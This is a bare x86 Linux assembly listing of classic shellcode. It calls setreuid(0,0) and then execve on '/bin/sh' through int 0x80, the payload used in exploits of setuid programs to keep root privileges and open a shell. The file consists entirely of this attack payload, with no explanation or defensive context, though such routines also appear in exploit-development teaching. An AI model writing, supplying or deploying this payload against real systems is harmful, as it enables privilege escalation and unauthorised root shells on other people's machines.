section .data

filepath db "/bin/shXAAAABBBB"

section .text

global start

start:
    mov eax,70
    mov ebx,0
    mov ecx,0
   int 0x80

    mov eax,0
    mov ebx,filepath
    mov [ebx+7],al

    mov [ebx+8],ebx

    mov [ebx+12],eax

    mov eax,11
    lea ecx,[ebx+8]
    lea edx,[ebx+12]

    int 0x80
